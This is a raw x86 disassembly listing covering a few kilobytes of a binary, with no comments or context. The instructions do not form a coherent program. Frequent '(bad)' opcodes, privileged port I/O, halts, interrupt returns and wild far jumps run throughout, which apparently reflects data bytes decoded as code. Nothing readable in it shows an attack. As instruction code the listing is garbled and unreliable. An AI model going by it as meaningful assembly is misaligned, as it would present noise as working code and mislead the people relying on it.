  421e96:	les    eax,FWORD PTR [edi]
  421e98:	dec    BYTE PTR ds:0xc1c0aaec
  421e9e:	rol    ebp,1
  421ea0:	ror    ah,0xc4
  421ea3:	sti    
  421ea4:	int3   
  421ea5:	int3   
  421ea6:	in     al,dx
  421ea7:	out    dx,eax
  421ea8:	iret   
  421ea9:	mov    eax,0xde07c8b0
  421eae:	loope  0x421e83
  421eb0:	add    BYTE PTR [esi+esi*8+0x4fbc5fd],bh
  421eb7:	in     al,dx
  421eb8:	(bad)  
  421eba:	repz out 0xbc,eax
  421ebd:	rcl    ecx,1
  421ebf:	lock loope 0x421e85
  421ec2:	mov    dh,0xd0
  421ec4:	loopne 0x421eac
  421ec6:	mov    edi,0xdcf4ddd4
  421ecb:	mov    ecx,0xbbeebdc3
  421ed0:	call   esi
  421ed2:	xlat   BYTE PTR ds:[ebx]
  421ed3:	fld    QWORD PTR [ecx]
  421ed5:	iret   
  421ed6:	loop   0x421edf
  421ed8:	in     al,0x2
  421eda:	(bad)  
  421edc:	out    dx,eax
  421edd:	leave  
  421ede:	test   esp,0xd9d1bbaa
  421ee4:	stc    
  421ee5:	mov    edi,0xdad4f5be
  421eea:	clc    
  421eeb:	enter  0x2f7,0xd4
  421eef:	add    dl,dl
  421ef1:	add    ecx,ebx
  421ef3:	call   0x94808bd
  421ef8:	iret   
  421ef9:	retf   0xc80e
  421efc:	fmulp  st(7),st
  421efe:	out    dx,al
  421eff:	int    0xcf
  421f01:	jmp    0xbbde:0xcbc0f0f2
  421f08:	in     eax,dx
  421f09:	sar    ch,1
  421f0b:	int3   
  421f0c:	(bad)  
  421f0d:	not    edi
  421f0f:	fsub   st,st(1)
  421f11:	shl    ah,1
  421f13:	or     edx,edi
  421f15:	(bad)  
  421f17:	or     eax,0xc4da13e0
  421f1c:	mov    ch,0xd6
  421f1f:	lock iret 
  421f21:	int3   
  421f22:	mov    dh,0xc0
  421f24:	lock fsubp st(0),st
  421f27:	out    dx,eax
  421f28:	in     eax,dx
  421f29:	(bad)  
  421f2a:	rcr    bl,cl
  421f2c:	(bad)  
  421f2e:	(bad)  
  421f30:	rol    DWORD PTR [ebx],0xf7
  421f33:	std    
  421f34:	loop   0x421f41
  421f36:	(bad)  
  421f38:	sti    
  421f39:	repnz fsubr QWORD PTR [eax-0x3e09131f]
  421f40:	lock mov bl,0xee
  421f43:	not    eax
  421f45:	int    0xb9
  421f47:	xlat   BYTE PTR ds:[ebx]
  421f48:	sar    DWORD PTR [eax-0x2b2d3712],cl
  421f4e:	out    dx,al
  421f4f:	int    0xc5
  421f51:	jmp    0xdc06:0xc8d0e9c0
  421f58:	add    ebp,edi
  421f5a:	add    BYTE PTR [ebp-0x1e0c4c58],ch
  421f60:	lods   al,BYTE PTR ds:[esi]
  421f61:	loope  0x421f4c
  421f63:	rol    esp,1
  421f65:	(bad)  
  421f66:	aad    0xf1
  421f68:	mov    ah,0xf2
  421f6a:	rcl    ecx,1
  421f6c:	mov    edx,0xf9f3fbce
  421f71:	fdiv   st,st(0)
  421f73:	hlt    
  421f74:	add    edi,esi
  421f76:	mov    esp,0xcfeee3fb
  421f7b:	shl    ah,cl
  421f7d:	in     eax,dx
  421f7e:	mov    ebp,0xdac2e1bd
  421f83:	hlt    
  421f84:	iret   
  421f85:	out    0xf5,al
  421f87:	in     al,dx
  421f88:	repz mov edi,0xffb9dac9
  421f8e:	(bad)  
  421f8f:	mov    ebx,0x9d7d5fe
  421f94:	add    DWORD PTR [eax],ecx
  421f96:	sti    
  421f97:	add    bh,cl
  421f99:	jmp    0xc41a0c68
  421f9e:	into   
  421f9f:	in     al,0xf1
  421fa1:	aad    0xeb
  421fa3:	mov    dl,0xbb
  421fa5:	aam    0xd2
  421fa7:	sti    
  421fa8:	jmp    0x6f3:0xd3dbec
  421faf:	(bad)  
  421fb0:	jmp    0x421fad
  421fb2:	in     eax,0xc5
  421fb4:	shl    cl,1
  421fb6:	or     bh,cl
  421fb8:	fxch   st(4)
  421fba:	fdiv   DWORD PTR [edx-0x4a37343e]
  421fc0:	loop   0x421f8c
  421fc2:	sti    
  421fc3:	jmp    0x421f79
  421fc5:	(bad)  
  421fc6:	fidivr WORD PTR [edi-0x120e2f2f]
  421fcc:	std    
  421fcd:	aam    0xd2
  421fcf:	add    BYTE PTR [esi],al
  421fd1:	or     ebx,eax
  421fd3:	sar    ebp,0xd8
  421fd6:	(bad)  
  421fd7:	push   cs
  421fd8:	loop   0x421fdd
  421fda:	in     eax,dx
  421fdb:	fsubrp st(4),st
  421fdd:	(bad)  
  421fdf:	mov    ebp,0xc9dad5c9
  421fe4:	jmp    0xcdd1:0xdad7e4ed
  421feb:	in     al,dx
  421fec:	add    bh,ch
  421fee:	div    esp
  421ff0:	add    edx,edi
  421ff2:	cli    
  421ff3:	jmp    0x53ddde0
  421ff8:	or     eax,0xdcd00fe7
  421ffd:	ret    0xadcb
  422000:	mov    dl,0xcb
  422002:	into   
  422003:	in     al,0xd3
  422005:	mov    ecx,0xd3fbd4f4
  42200a:	retf   0xd7bd
  42200d:	out    dx,al
  42200e:	mov    esi,0x7e5d2e6
  422013:	or     ah,ah
  422015:	or     DWORD PTR [eax],eax
  422017:	out    0x13,eax
  422019:	in     al,dx
  42201a:	in     eax,0xec
  42201c:	scas   eax,DWORD PTR es:[edi]
  42201d:	int    0xf6
  42201f:	hlt    
  422020:	imul   ah
  422022:	jmp    0x422014
  422024:	icebp  
  422025:	cli    
  422026:	mov    ah,0xd5
  422028:	fcos   
  42202a:	sti    
  42202b:	icebp  
  42202c:	fst    st(3)
  42202e:	in     eax,0xc0
  422030:	push   es
  422031:	stc    
  422032:	mov    eax,0xc0030fe9
  422037:	or     dl,BYTE PTR [ebx]
  422039:	repnz adc ebp,DWORD PTR [edx-0x1e3f0f4d]
  422040:	jmp    0xd3f5eb27
  422045:	jmp    0x422045
  422047:	std    
  422048:	in     eax,dx
  422049:	mov    esp,0xc7eedde8
  42204e:	rol    DWORD PTR [ebx],1
  422050:	add    eax,0xfa04ddc3
  422055:	fdivr  st(4),st
  422057:	std    
  422058:	vmload 
  42205b:	(bad)  
  42205c:	(bad)
  42205f:	out    dx,al
  422060:	call   0xfbf5050e
  422065:	icebp  
  422066:	idiv   ecx
  422068:	cmc    
  422069:	mov    ah,0xb4
  42206b:	stc    
  42206c:	(bad)  
  42206d:	icebp  
  42206e:	rol    DWORD PTR ds:0xc4d1f5de,0xd7
  422075:	cmc    
  422076:	fmul   QWORD PTR ds:0xe6ce05cf
  42207c:	out    dx,al
  42207d:	mov    ebp,0xf5ebcbeb
  422082:	ret    0xe6ec
  422085:	sti    
  422086:	(bad)  
  422087:	hlt    
  422088:	shr    edi,1
  42208a:	cmc    
  42208b:	icebp  
  42208c:	ret    0xe1e6
  42208f:	add    al,ah
  422091:	icebp  
  422092:	fmul   st(2),st
  422094:	test   DWORD PTR [esi],0xe9fdc6d9
  42209a:	in     eax,0xab
  42209c:	jmp    0xecb2:0xfbf1e8ae
  4220a3:	(bad)  
  4220a4:	icebp  
  4220a5:	fptan  
  4220a7:	retf   
  4220a8:	retf   
  4220a9:	cli    
  4220aa:	stc    
  4220ab:	ret    
  4220ac:	dec    ebp
  4220ae:	(bad)  
  4220b0:	(bad)  
  4220b1:	(bad)  
  4220b3:	dec    BYTE PTR [edi]
  4220b5:	mul    cl
  4220b7:	aad    0xe9
  4220b9:	repz repnz repz in al,0xad
  4220be:	ror    dl,0xaa
  4220c1:	in     eax,0xc0
  4220c3:	mov    cl,0xae
  4220c5:	fidivr WORD PTR [edi-0x636074b]
  4220cb:	enter  0xfef0,0xd2
  4220cf:	fadd   QWORD PTR ds:0xf7d0ded4
  4220d5:	fcmove st,st(3)
  4220d7:	fucomp st(6)
  4220d9:	in     eax,dx
  4220da:	int    0xb1
  4220dc:	mov    bl,0xe3
  4220de:	jmp    0xccee:0xeeadf5c9
  4220e5:	xlat   BYTE PTR ds:[ebx]
  4220e6:	dec    ebx
  4220e8:	mov    edi,0xeefae8bc
  4220ed:	neg    dl
  4220ef:	div    eax
  4220f1:	sar    dl,0xe7
  4220f4:	add    eax,edi
  4220f6:	out    0xd5,al
  4220f8:	push   es
  4220f9:	enter  0xc8e3,0xd8
  4220fd:	test   al,0xb0
  4220ff:	loop   0x4220ed
  422101:	repz repz jmp 0xc9f2:0xfefadeec
  42210a:	xlat   BYTE PTR ds:[ebx]
  42210b:	leave  
  42210c:	out    dx,al
  42210d:	sti    
  42210e:	ret    
  42210f:	neg    ah
  422111:	add    eax,0x108c4d8
  422116:	cli    
  422117:	add    eax,0xb10ae502
  42211c:	scas   al,BYTE PTR es:[edi]
  42211d:	shr    eax,cl
  42211f:	mov    ebp,0xb3faefc1
  422124:	mov    ecx,0xececd7d6
  422129:	fmul   st,st(0)
  42212b:	fsubr  st,st(4)
  42212d:	shl    ebx,1
  42212f:	add    cl,al
  422131:	repz sti 
  422133:	aam    0xe6
  422135:	in     al,0x7
  422137:	lds    ecx,FWORD PTR ds:0xb3c2fa0f
  42213d:	jecxz  0x422105
  42213f:	xlat   BYTE PTR ds:[ebx]
  422140:	lock mov bl,0xf4
  422143:	enter  0xbbd7,0xd6
  422147:	stc    
  422148:	fst    st(2)
  42214a:	std    
  42214b:	hlt    
  42214c:	in     eax,dx
  42214d:	cli    
  42214e:	(bad)  
  422150:	out    0xf4,al
  422152:	loop   0x422151
  422154:	les    eax,FWORD PTR [edx]
  422156:	fndisi(8087 only) 
  422158:	call   0xf02bfa42
  42215d:	mov    esi,0xb1c5cfe8
  422162:	stc    
  422163:	mov    bl,0xb6
  422165:	rcr    eax,1
  422167:	out    dx,al
  422168:	in     al,dx
  422169:	cld    
  42216a:	mov    eax,0xc2c3ce01
  42216f:	add    ah,ah
  422171:	(bad)  
  422173:	add    bh,ah
  422175:	out    0xe6,al
  422177:	retf   
  422178:	jmp    0xdd022c7a
  42217d:	out    0xcf,eax
  42217f:	hlt    
  422180:	(bad)  
  422181:	sti    
  422182:	repz fucomi st,st(0)
  422185:	(bad)  
  422187:	repnz out dx,eax
  422189:	xlat   BYTE PTR ds:[ebx]
  42218a:	fmul   st,st(1)
  42218c:	into   
  42218d:	rol    DWORD PTR ds:0xd0ebbac1,0xc7
  422194:	in     al,0x7
  422196:	mov    esp,0xe50601db
  42219b:	mov    ecx,0xd0ecbdc2
  4221a0:	jmp    0xeaed:0xf7cbe9f7
  4221a7:	(bad)  
  4221a9:	mov    ah,0xec
  4221ab:	ret    
  4221ac:	mov    eax,0xcce4e2f4
  4221b1:	fild   WORD PTR ds:0xc6d4f0fb
  4221b7:	add    al,BYTE PTR [edi]
  4221b9:	in     eax,0xec
  4221bb:	leave  
  4221bc:	mov    dl,0xbe
  4221be:	xlat   BYTE PTR ds:[ebx]
  4221bf:	jecxz  0x4221b7
  4221c1:	mov    edx,0xb7d8aeb3
  4221c7:	(bad)  
  4221c8:	hlt    
  4221c9:	bnd ret 0xd6f2
  4221cd:	push   es
  4221ce:	push   es
  4221cf:	(bad)
  4221d2:	rol    DWORD PTR [eax*1-0x363610fc],0xe
  4221da:	enter  0xeed9,0xc1
  4221de:	in     eax,dx
  4221df:	shr    eax,1
  4221e1:	retf   0xcbc0
  4221e4:	mov    eax,0xd9b9e8fb
  4221e9:	fidivr WORD PTR [ecx-0x2d404338]
  4221ef:	cli    
  4221f0:	icebp  
  4221f1:	fcmovnbe st,st(5)
  4221f3:	jecxz  0x4221ee
  4221f5:	fscale 
  4221f7:	(bad)  
  4221f8:	out    0x5,al
  4221fa:	or     ah,bh
  4221fc:	mov    edi,0xeff1d2be
  422201:	in     eax,dx
  422202:	out    0xed,eax
  422204:	(bad)  
  422205:	jmp    0x4221bd
  422207:	(bad)  
  422208:	jmp    0xf602:0xc3d0e2cf
  42220f:	std    
  422210:	in     eax,0xe6
  422212:	aam    0xd6
  422214:	out    dx,eax
  422215:	fcomp  st(3)
  422217:	(bad)  
  422219:	int    0xdc
  42221b:	call   0xb00712e0
  422220:	iret   
  422221:	mov    ebx,0xd6f0d3c5
  422226:	mov    edx,0xf6d503b7
  42222b:	loopne 0x42221a
  42222d:	(bad)  
  42222e:	int3   
  42222f:	ret    
  422230:	fcmovnbe st,st(5)
  422232:	in     al,0xfa
  422234:	jmp    0x422245
  422236:	sti    
  422237:	out    0xda,eax
  422239:	add    bl,dh
  42223b:	rol    al,0xee
  42223e:	retf   
  42223f:	call   0xfb14f42a
  422244:	cli    
  422245:	mov    ch,0xd3
  422247:	jmp    0xfcc2:0xbaedbff1
  42224e:	sar    DWORD PTR [ebp+0xbdac1d6],1
  422254:	std    
  422255:	fadd   st(5),st
  422257:	add    eax,0xad0303cf
  42225c:	sar    BYTE PTR [edi-0xa321a30],cl
  422262:	shl    BYTE PTR [edi-0x700311a],1
  422268:	mov    dl,0xee
  42226a:	xlat   BYTE PTR ds:[ebx]
  42226b:	test   BYTE PTR [ebx],0x7
  42226e:	(bad)  
  42226f:	in     eax,dx
  422270:	(bad)  
  422271:	aad    0xe0
  422273:	aad    0xd6
  422275:	sti    
  422276:	(bad)  
  422278:	in     eax,dx
  422279:	fcmovne st,st(4)
  42227b:	shl    DWORD PTR [esi-0xc2e2c4e],1
  422281:	(bad)  
  422282:	int3   
  422283:	shl    BYTE PTR [ecx-0x4b334b39],1
  422289:	mov    ch,0xe9
  42228b:	out    dx,eax
  42228c:	inc    DWORD PTR [edi]
  42228e:	std    
  42228f:	mov    esi,0xfd04d904
  422294:	sti    
  422295:	(bad)  
  422296:	(bad)  
  422297:	ffree  st(6)
  422299:	jmp    0xcf01e58c
  42229e:	jmp    0xe9c7:0xc9c7b4d1
  4222a5:	(bad)  
  4222a6:	(bad)  
  4222a7:	jmp    0xf7011f69
  4222ac:	mov    ebp,0xfbf605fb
  4222b1:	clc    
  4222b2:	ret    0xb0b
  4222b5:	leave  
  4222b6:	clc    
  4222b7:	jmp    0xf7bc:0xeecde507
  4222be:	test   al,0xe6
  4222c0:	rol    cl,0xc7
  4222c3:	call   0xe6191e93
  4222c8:	(bad)  
  4222c9:	mov    edi,0xc0d9b9bb
  4222ce:	fcom   st(0)
  4222d0:	int3   
  4222d1:	(bad)
  4222d4:	loop   0x42229a
  4222d6:	leave  
  4222d7:	or     eax,0xeb01fbdd
  4222dc:	mov    esp,0xedbdc2bf
  4222e1:	test   eax,0xc8d5d5b0
  4222e6:	repz clc 
  4222e8:	xlat   BYTE PTR ds:[ebx]
  4222e9:	mov    edi,0xe0defff6
  4222ee:	loopne 0x4222d7
  4222f0:	cld    
  4222f1:	shl    esi,1
  4222f3:	or     dh,bl
  4222f5:	fmul   DWORD PTR ds:0xe8e5e7dd
  4222fb:	repz out dx,eax
  4222fd:	scas   eax,DWORD PTR es:[edi]
  4222fe:	iret   
  4222ff:	shl    DWORD PTR [ebp-0x1b24044e],0xb0
  422306:	mov    ebx,0xf0c8dcd0
  42230b:	lock call 0xff05f7ec
  422311:	add    ebp,esp
  422313:	stc    
  422314:	pop    es
  422315:	ror    DWORD PTR [ecx],0xe6
  422318:	cli    
  422319:	rcr    esi,cl
  42231b:	mov    esp,0xc1cfe0ad
  422320:	mov    dh,0xed
  422322:	shl    ebp,1
  422324:	lock xlat BYTE PTR ds:[ebx]
  422326:	xlat   BYTE PTR ds:[ebx]
  422327:	mov    edx,0xfb02ebcb
  42232c:	mov    ebp,0xf5db01c3
  422331:	(bad)  
  422333:	fdivr  DWORD PTR [esi-0x361f35ff]
  422339:	push   cs
  42233a:	loopne 0x422307
  42233c:	call   0xb439ed37
  422341:	sar    ecx,0xc4
  422344:	out    dx,eax
  422345:	jmp    0xe43f1f29
  42234a:	cmc    
  42234b:	lock inc BYTE PTR [esi]
  42234e:	fadd   QWORD PTR [edi]
  422350:	repz jmp 0xd80d:0xe80f00f0
  422358:	jmp    0xceb0:0xeab2eefb
  42235f:	mov    esp,0xf8c6d1bc
  422364:	mov    ah,0xe6
  422366:	icebp  
  422367:	in     eax,0xb6
  422369:	iret   
  42236a:	mov    ecx,0xdbe6d1fc
  42236f:	(bad)  
  422372:	pop    es
  422373:	std    
  422374:	leave  
  422375:	retf   
  422376:	retf   0xebe8
  422379:	sti    
  42237a:	int    0xc8
  42237c:	mov    ebx,0xb1d6e3d0
  422382:	fstp   TBYTE PTR [edx-0x264b011b]
  422388:	idiv   BYTE PTR [ebp-0x21e060f]
  42238e:	fcomip st,st(3)
  422390:	cmc    
  422391:	repnz shr ecx,1
  422394:	push   es
  422395:	(bad)  
  422396:	clc    
  422397:	loope  0x422363
  422399:	out    dx,al
  42239a:	into   
  42239b:	in     al,0xe7
  42239d:	int    0xe5
  42239f:	aad    0xc7
  4223a1:	int    0xc7
  4223a3:	fdiv   DWORD PTR [esi-0x43422433]
  4223a9:	loop   0x42236a
  4223ab:	clc    
  4223ac:	jecxz  0x42236b
  4223ae:	stc    
  4223af:	add    bl,al
  4223b1:	faddp  st(6),st
  4223b3:	out    0xe4,eax
  4223b5:	fisttp QWORD PTR [ebx]
  4223b7:	aad    0xd9
  4223b9:	int    0x7
  4223bb:	(bad)  
  4223bc:	call   0xe12b0ca8
  4223c1:	mov    bh,0xd2
  4223c4:	fcom   st(6)
  4223c6:	enter  0xb9d9,0x3
  4223ca:	cld    
  4223cb:	ret    
  4223cc:	into   
  4223cd:	mov    ecx,0xd9c7ddbd
  4223d2:	pop    es
  4223d3:	jmp    0x4223d8
  4223d5:	inc    dh
  4223d7:	loop   0x4223ad
  4223d9:	repz or edi,DWORD PTR [eax-0xe105620]
  4223e0:	call   0xef2ff59a
  4223e5:	enter  0xf7b4,0xfe
  4223e9:	call   0xfb0221ea
  4223ee:	icebp  
  4223ef:	add    dl,cl
  4223f1:	bnd ret 0xf50b
  4223f5:	loopne 0x4223f5
  4223f7:	cmc    
  4223f8:	or     ebx,ebp
  4223fa:	or     al,cl
  4223fc:	mov    al,0xa9
  4223fe:	rep lods al,BYTE PTR ds:[esi]
  422400:	int3   
  422401:	aam    0xec
  422403:	loopne 0x4223d5
  422405:	in     eax,dx
  422406:	fsubp  st(6),st
  422408:	jmp    0xcee6:0xb6f3dcd0
  42240f:	mov    edi,0xdbf7dceb
  422414:	fdiv   st,st(6)
  422416:	add    eax,0xf1ebc8cf
  42241b:	mov    eax,0xd1d6f0f2
  422420:	(bad)
  422423:	enter  0xefee,0xfe
  422427:	fcmove st,st(2)
  422429:	(bad)  
  42242a:	mov    esp,0xddd4dfef
  42242f:	mov    ebx,0x606f4d4
  422434:	push   es
  422435:	aam    0xde
  422437:	add    edx,DWORD PTR [ebx]
  422439:	(bad)  
  42243a:	std    
  42243b:	out    0xac,al
  42243d:	loopne 0x422435
  42243f:	in     al,dx
  422440:	scas   al,BYTE PTR es:[edi]
  422441:	shl    BYTE PTR [ecx+eax*8-0x2a4f37],0xc8
  422449:	jecxz  0x422404
  42244b:	mov    esi,0xec01fbd4
  422450:	sar    BYTE PTR [ebp-0x37f60a2a],cl
  422456:	leave  
  422457:	loope  0x422461
  422459:	or     ebx,esp
  42245b:	rol    bl,0xe4
  42245e:	fsubp  st(3),st
  422460:	in     eax,dx
  422461:	out    dx,al
  422462:	rcr    bl,1
  422464:	cmc    
  422465:	out    0xfa,al
  422467:	mov    ebx,0xdde9b4f4
  42246c:	cmc    
  42246d:	mov    ch,0xec
  42246f:	(bad)  
  422471:	repnz fsub st,st(0)
  422474:	add    al,0x0
  422476:	pand   mm7,mm5
  422479:	jmp    0xefe8:0xd3e7bce1
  422480:	shl    DWORD PTR [ebp-0x524a321e],1
  422486:	in     eax,0xf4
  422488:	mov    ecx,0xd5d402ee
  42248d:	sti    
  42248e:	(bad)  
  42248f:	fdivr  st(5),st
  422491:	add    eax,0xda00ded2
  422496:	out    dx,al
  422497:	or     DWORD PTR [ebx+esi*8],ecx
  42249a:	jecxz  0x42247a
  42249c:	rol    bl,1
  42249e:	ret    
  42249f:	rcr    esp,1
  4224a1:	frstpm(287 only) 
  4224a3:	aad    0xf5
  4224a5:	mov    dh,0xc4
  4224a7:	mov    dh,0xc8
  4224a9:	mov    eax,0xdabdc8fb
  4224ae:	std    
  4224af:	jecxz  0x422478
  4224b1:	xlat   BYTE PTR ds:[ebx]
  4224b2:	ret    0xdc08
  4224b5:	add    eax,0xae9d40b
  4224ba:	fnstsw WORD PTR [eax+edi*4-0xe2c0f11]
  4224c1:	aam    0xac
  4224c3:	jmp    0xd9db:0xf7deb8c6
  4224ca:	fcomi  st,st(6)
  4224cc:	stc    
  4224cd:	add    ah,al
  4224cf:	std    
  4224d0:	stc    
  4224d1:	rcr    dh,1
  4224d3:	add    dh,dh
  4224d5:	(bad)  
  4224d7:	cld    
  4224d8:	out    dx,eax
  4224d9:	or     eax,DWORD PTR [edx+edx*8]
  4224dc:	retf   0xc3e3
  4224df:	aad    0xec
  4224e1:	mov    dh,0xc6
  4224e3:	loopne 0x4224d3
  4224e5:	(bad)  
  4224e6:	xlat   BYTE PTR ds:[ebx]
  4224e7:	(bad)  
  4224e8:	cld    
  4224e9:	mov    ebx,0xfee8fedb
  4224ee:	rcl    edx,0xbd
  4224f1:	icebp  
  4224f2:	stc    
  4224f3:	(bad)  
  4224f4:	lock push es
  4224f6:	leave  
  4224f7:	out    0xfc,al
  4224f9:	jmp    0xaddc:0xd2ceaa01
  422500:	scas   al,BYTE PTR es:[edi]
  422501:	repz lock lock call esp
  422506:	retf   0xd0d3
  422509:	mul    dl
  42250b:	cli    
  42250c:	pop    es
  42250d:	repnz add ah,dh
  422510:	pop    es
  422511:	rcr    esi,1
  422513:	or     esi,eax
  422515:	retf   0xf8f6
  422518:	or     bl,ah
  42251a:	icebp  
  42251b:	lods   al,BYTE PTR ds:[esi]
  42251c:	scas   al,BYTE PTR es:[edi]
  42251d:	ret    
  42251e:	loope  0x422512
  422520:	cmc    
  422521:	in     eax,0xd6
  422523:	mov    bh,0xd9
  422525:	iret   
  422526:	int3   
  422527:	(bad)  
  422529:	cld    
  42252a:	(bad)  
  42252b:	jmp    0xe40a0525
  422530:	(bad)  
  422532:	fcomp  st(7)
  422534:	in     al,0xa
  422536:	fiadd  WORD PTR [ecx]
  422538:	add    ch,al
  42253a:	out    dx,al
  42253b:	out    0xae,al
  42253d:	mov    al,0xd1
  42253f:	in     al,0xdb
  422541:	lods   al,BYTE PTR ds:[esi]
  422542:	hlt    
  422543:	hlt    
  422544:	mov    eax,0xfee4beff
  422549:	repz int3 
  42254b:	jmp    0xd7272c2a
  422550:	jecxz  0x422545
  422552:	add    al,ch
  422554:	rcr    ah,0xc8
  422557:	or     al,0xd4
  422559:	int    0x5
  42255b:	retf   0xdfa6
  42255e:	jmp    0xe6c8:0xb3e9f2ac
  422565:	repz icebp 
  422567:	fidivr WORD PTR [ebp-0xf130b3d]
  42256d:	into   
  42256e:	clc    
  42256f:	mov    esi,0xcae7fdc7
  422574:	fadd   QWORD PTR [ebx]
  422576:	loop   0x422584
  422578:	stc    
  422579:	add    eax,0xa5bedc03
  42257e:	cmc    
  42257f:	in     eax,dx
  422580:	lock mov dl,0xcf
  422583:	scas   eax,DWORD PTR es:[edi]
  422584:	sar    cl,1
  422586:	mov    ch,0xec
  422588:	mov    dl,0xf5
  42258a:	sti    
  42258b:	test   BYTE PTR [ebx],0xe7
  42258e:	std    
  42258f:	cli    
  422590:	mov    esi,0x7d6d0e1
  422595:	clc    
  422596:	stc    
  422597:	or     eax,0xcee7c1e1
  42259c:	ffreep st(7)
  42259e:	in     al,0xec
  4225a0:	mov    ch,0xe4
  4225a3:	loopne 0x42256d
  4225a5:	push   ecx
  4225a7:	fsubr  st,st(1)
  4225a9:	in     eax,dx
  4225aa:	shl    dh,1
  4225ac:	sar    DWORD PTR [eax-0x1d000803],0xff
  4225b3:	(bad)  
  4225b4:	cld    
  4225b5:	push   es
  4225b6:	retf   0xf801
  4225b9:	repnz cld 
  4225bb:	scas   al,BYTE PTR es:[edi]
  4225bc:	loop   0x42259b
  4225be:	jmp    0xea110696
  4225c3:	aam    0xd0
  4225c5:	fild   QWORD PTR [ebx+edx*8-0x28041c4a]
  4225cc:	shl    al,1
  4225ce:	int    0xc6
  4225d0:	div    bh
  4225d2:	push   es
  4225d3:	stc    
  4225d4:	out    dx,eax
  4225d5:	call   0x22e29e9
  4225da:	repz ffree st(0)
  4225dd:	(bad)  
  4225de:	leave  
  4225df:	repnz aad 0xda
  4225e2:	leave  
  4225e3:	fadd   st,st(4)
  4225e5:	iret   
  4225e6:	(bad)  
  4225e7:	(bad)  
  4225e9:	mov    cl,0xcd
  4225eb:	cld    
  4225ec:	fsub   st(6),st
  4225ee:	fadd   QWORD PTR [eax]
  4225f0:	shl    ecx,cl
  4225f2:	sti    
  4225f3:	(bad)  
  4225f4:	(bad)  
  4225f6:	jmp    0xb3e4:0x11e50404
  4225fd:	loope  0x4225eb
  4225ff:	call   0xba1711f9
  422604:	repnz in eax,dx
  422606:	out    dx,eax
  422607:	in     al,dx
  422608:	(bad)  
  422609:	fcmovne st,st(1)
  42260b:	fcomip st,st(2)
  42260d:	sti    
  42260e:	cld    
  42260f:	add    BYTE PTR [ebx],cl
  422611:	jmp    edx
  422613:	add    al,0xb
  422615:	clc    
  422616:	loop   0x422603
  422618:	call   0xb10c10fb
  42261d:	in     al,dx
  42261e:	cmc    
  42261f:	mov    ebp,0xf1fbe6b2
  422624:	in     al,0xcd
  422626:	hlt    
  422627:	jmp    0xfc37e20f
  42262c:	cli    
  42262d:	cld    
  42262e:	inc    BYTE PTR [eax]
  422630:	sti    
  422631:	(bad)  
  422633:	mul    esi
  422635:	push   es
  422636:	iret   
  422637:	cld    
  422638:	into   
  422639:	or     edi,edi
  42263b:	fisubr WORD PTR [esi-0x1b4e1943]
  422641:	rol    esi,0xb3
  422644:	jmp    0x42262d
  422646:	shr    edx,cl
  422648:	call   edi
  42264a:	(bad)  
  42264b:	fsubr  st(7),st
  42264d:	mov    edi,0xd5dabbfb
  422652:	xlat   BYTE PTR ds:[ebx]
  422653:	add    esi,ebx
  422655:	xlat   BYTE PTR ds:[ebx]
  422656:	or     bh,al
  422658:	or     ecx,DWORD PTR [ebx]
  42265a:	loop   0x422634
  42265c:	mov    bl,0xe4
  42265e:	lods   eax,DWORD PTR ds:[esi]
  42265f:	shl    bh,cl
  422661:	mov    bh,0xb4
  422663:	scas   eax,DWORD PTR es:[edi]
  422664:	retf   0xe8f1
  422667:	sar    BYTE PTR [edi+ecx*8-0x70dfd25],cl
  42266e:	mov    eax,0xc6d80bf7
  422673:	mov    edi,0xae903df
  422678:	fdivr  st,st(3)
  42267a:	iret   
  42267b:	loope  0x422674
  42267d:	jecxz  0x422644
  42267f:	loopne 0x42262e
  422681:	sti    
  422682:	out    dx,al
  422683:	jmp    0xd30b165f
  422688:	iret   
  422689:	ror    esi,cl
  42268b:	int3   
  42268c:	int3   
  42268d:	(bad)  
  42268f:	icebp  
  422690:	(bad)  
  422691:	fdivrp st(7),st
  422693:	shl    ah,0xd7
  422696:	out    0xcd,al
  422698:	(bad)  
  422699:	adc    ebx,esp
  42269b:	shr    BYTE PTR [esi-0x170a1039],cl
  4226a1:	in     eax,dx
  4226a2:	out    dx,eax
  4226a3:	cli    
  4226a4:	aam    0xb8
  4226a6:	lock mov bh,0xdf
  4226a9:	shl    dl,1
  4226ab:	rcr    dl,cl
  4226ad:	std    
  4226ae:	shl    ebx,0xc3
  4226b1:	div    ecx
  4226b3:	add    dh,bh
  4226b5:	fadd   QWORD PTR [esi]
  4226b7:	loop   0x4226b9
  4226b9:	add    BYTE PTR [edx],al
  4226bb:	(bad)  
  4226bc:	out    dx,eax
  4226bd:	out    0xe3,al
  4226bf:	int    0xe5
  4226c1:	test   eax,0xd4b4cef9
  4226c6:	lods   al,BYTE PTR ds:[esi]
  4226c7:	fdivp  st(6),st
  4226c9:	aad    0xc9
  4226cb:	jmp    0xd144eeaf
  4226d0:	jmp    0x4226d3
  4226d2:	add    al,al
  4226d4:	add    al,bh
  4226d6:	leave  
  4226d7:	out    dx,eax
  4226d8:	in     eax,dx
  4226d9:	fdiv   st,st(3)
  4226db:	out    dx,al
  4226dc:	test   eax,0xb6e8c2e5
  4226e1:	in     al,0xc4
  4226e3:	mov    dh,0xf7
  4226e5:	mov    cl,0xd4
  4226e7:	mov    esi,0xf5b9deb8
  4226ec:	dec    bh
  4226ee:	into   
  4226ef:	push   es
  4226f0:	lds    edi,FWORD PTR [ecx-0x18faf816]
  4226f6:	add    eax,0xcfceff0f
  4226fb:	out    0xb1,eax
  4226fd:	div    al
  4226ff:	out    0xb3,eax
  422701:	shl    bh,1
  422703:	call   0xb8ef1aec
  422708:	retf   0xd0d3
  42270b:	fxtract 
  42270d:	mov    ch,0x2
  42270f:	aam    0xd1
  422711:	add    ah,al
  422713:	cli    
  422714:	(bad)  
  422715:	call   0xe81e04f9
  42271a:	jmp    0x422708
  42271c:	test   eax,0xd6e1e7f2
  422721:	xlat   BYTE PTR ds:[ebx]
  422722:	int3   
  422723:	out    0xc0,eax
  422725:	sar    DWORD PTR [edi-0x1337101b],cl
  42272b:	ret    
  42272c:	add    ch,dh
  42272e:	ret    0xd7da
  422731:	clc    
  422732:	(bad)  
  422733:	stc    
  422734:	shl    ch,0xe3
  422737:	into   
  422738:	jecxz  0x422704
  42273a:	repnz stos BYTE PTR es:[edi],al
  42273c:	mov    ebp,0xcfb5b2bd
  422741:	int3   
  422742:	in     al,0xdb
  422744:	mov    eax,0xd2bbb8d7
  422749:	stc    
  42274a:	int3   
  42274b:	add    ebp,ebx
  42274d:	mov    ch,0xe0
  42274f:	push   es
  422750:	in     al,dx
  422751:	rol    al,1
  422753:	jecxz  0x422738
  422755:	mov    BYTE PTR [ebx],0xe7
  422758:	jmp    0xb7ad:0xd2dceae1
